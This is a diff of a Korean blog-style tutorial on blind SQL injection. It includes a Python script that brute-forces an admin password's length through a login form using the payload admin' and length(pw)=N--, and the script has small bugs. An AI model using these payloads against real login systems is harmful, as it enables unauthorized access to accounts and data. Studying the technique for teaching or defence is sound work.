@@ -4,20 +4,67 @@
 
 > 임의의 sql 구문을 만들어 데이터를 열람하는 공격이다.
 
-mysql 같은경우 substr , mid , length 같은 함수들로
+즉 어떠한 데이터베이스에 공격을할때 임의의 query 를 만들어서 반환값을 이용해 한글자씩 따온다.
 
-브루트포싱(무차별 대입)으로 한글자씩 알아내는 과정을 많이 사용한다.
+예 db 구조
+```sql
+database -> member
+tables -> member
+column -> (id,pw)
+data -> ("admin","password"),("guest","guest")
+```
+```sql
+SELECT * FROM member WHERE id='' and pw='';
+```
+위의 sql 쿼리로 login 을 체크할 시에
+python 으로 blind sql injection 로 예를 든다면
 
-그러면 mysql 에서 참이면 로그인 성공 실패하면 로그인 실패로 예를들어보자
+```py
+import requests
 
-substr 이나 mid 같은경우 자신이 원하는 컬럼을 넣으면 
+Url = "in url"
 
-해당 값의 문자열을 잘라 반환한다.
+for length in range(1,100):
+    data = {
+        'uid':f"admin' and length(pw)={length}--'"
+        'upw':'a'
+    }
 
-이 함수를 이용해 sql injection 이 가능하다면
+    r = requests.post(Url).text
 
-원하는 문자들로 하나씩 주입시켜 이제 참이라면 로그인 성공
+    if r.find("Login succee!") > 0:
+        print("admin user length pw : ",length)
+        break
+```
 
-만약에 주입한 문자열이 참이 아니라면 로그인 실패 
+다음과 같은 예로 data 라는 변수에 dict 형식으로 
 
-이런식으로 하나씩 반환되는 결과를 이용하여 원하는 데이터를 열람할수있다.
+blind sqli 에 사용되는 쿼리를 만들어서 
+
+requests 모듈로 요청한 뒤에 find 함수로 로그인 성공 감지됐다면 length 를 출력하는식이다.
+
+* * *
+
+간단하게 length(pw)={length} 에서 {} 안에 for loop 로 브루트포싱하여
+
+참값이 될때까지 반복하는것이다.
+
+위의 블라인드 인젝션이 성공되는 경우에는
+
+```sql
+SELECT * FROM member WHERE id='admin' and length(pw)=[1~100]
+```
+
+다음 쿼리와 같이 참의 값이 만들어져서 Login 이 우회되는것을 감지한다.
+
+* * *
+
+### length
+
+그리고 mysql 에서 length() 는 안에 들어가는 데이터나 값을 넣으면 해당 데이터의 길이를 반환한다.
+
+### 마무리
+
+blind sqli 에서 length 말고도 다양한 쿼리가 존재한다
+
+substr , left , ascii , mid 등등 다양한 문자열 , 길이를 브루트포싱하기위해 사용되는 함수가 많다.
